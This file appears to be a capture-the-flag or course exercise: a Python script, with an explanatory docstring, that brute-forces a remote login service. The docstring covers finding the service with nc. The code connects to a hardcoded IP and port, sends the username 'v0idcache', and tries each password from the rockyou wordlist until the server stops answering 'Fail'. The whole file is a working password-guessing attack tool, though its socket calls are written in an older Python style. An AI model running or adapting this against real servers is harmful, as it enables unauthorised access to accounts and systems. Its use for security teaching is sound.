"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:
        $ nc <ip address here> <port here>
    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.
    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.
    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.
    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
"""

import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = open("/usr/share/wordlists/rockyou.txt","r") # Point to wordlist file

def brute_force():

	username = "v0idcache"
 	for line in wordlist:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))

		data = s.recv(1024)
		print(data)
		
		password = line   # Hint: use wordlist

		s.send(username+"\n")

		data = s.recv(1024)
		print(data)

		s.send(password+"\n")

		data = s.recv(1024)

		if data == "Fail\n":
			print(data)
		else:
			print(password)
			print("success")
			break
		#print(password)

if __name__ == '__main__':
    brute_force()
